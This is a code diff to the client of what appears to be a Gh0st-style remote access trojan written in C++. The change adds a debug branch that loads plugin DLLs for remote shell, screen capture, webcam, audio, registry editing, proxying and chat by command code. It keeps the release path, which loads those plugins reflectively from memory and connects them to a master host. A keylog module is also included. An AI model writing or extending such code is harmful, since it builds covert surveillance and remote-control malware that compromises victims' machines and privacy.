@@ -7,6 +7,7 @@
 #include "common/KeyboardManager.h"
 #include "common/keylog.h"
 #include "common/ChatManager.h"
+#include <map>
 
 typedef BOOL (* PluginMe)(LPCTSTR strHost, UINT HostPort,LPBYTE lparam);
 
@@ -107,25 +108,32 @@ DWORD WINAPI Loop_SysPlugin(LPVOID lparam)
     LoadSysFromMemory(lparam,CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort,NULL);
     return 0;
 }
-// DWORD WINAPI Loop_SysInfoManager(SOCKET sRemote)
-// {
-// //	OutputDebugString("Loop_SysInfoManager");
-// 	CClientSocket	socketClient;
-// 	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
-// 		return -1;
-// 	CSysInfo	manager(&socketClient);
-// 	socketClient.run_event_loop();
-//
-// 	return 0;
-// }
+
 BOOL LoadFromMemory(LPVOID data,LPCTSTR lpszHost, UINT nPort,LPBYTE lpBuffer)
 {
-
-    HMEMORYMODULE module;
     PluginMe myPluginMe;
     const char name[] = {'P','l','u','g','i','n','M','e','\0'};
 
-    module = MemoryLoadLibrary(data);
+#ifdef _DEBUG // 调试模式直接加载DLL，以便解决问题
+	static std::map<BYTE, const char*> dllMap = {
+        {COMMAND_LIST_DRIVE, "FILE.dll"},
+        {COMMAND_SHELL, "SHELL.dll"},
+        {COMMAND_SCREEN_SPY, "SCREEN.dll"},
+        {COMMAND_AUDIO, "AUDIO.dll"},
+        {COMMAND_WEBCAM, "VIDEO.dll"},
+        {COMMAND_SERVICE_MANAGER, "SERVICE.dll"},
+        {COMMAND_REGEDIT, "REGEDIT.dll"},
+        {COMMAND_PROXY_MAP, "PROXY.dll"},
+        {COMMAND_TEXT_CHAT, "CHAT.dll"},
+	};
+    BYTE cmd = data ? ((BYTE*)data)[0] : NULL;
+    HMODULE h = data ? LoadLibraryA(dllMap[cmd]) : NULL;
+    myPluginMe = h ? (PluginMe)GetProcAddress(h, name) : NULL;
+    if (myPluginMe) {
+        myPluginMe(lpszHost, nPort, lpBuffer);
+    }
+#else
+    HMEMORYMODULE module = MemoryLoadLibrary(data);
     if (module == NULL) {
         goto exit;
     }
@@ -133,6 +141,7 @@ BOOL LoadFromMemory(LPVOID data,LPCTSTR lpszHost, UINT nPort,LPBYTE lpBuffer)
     myPluginMe = (PluginMe)MemoryGetProcAddress(module,name);
     myPluginMe(lpszHost,nPort,lpBuffer);
     MemoryFreeLibrary(module);
+#endif
 
 exit:
 
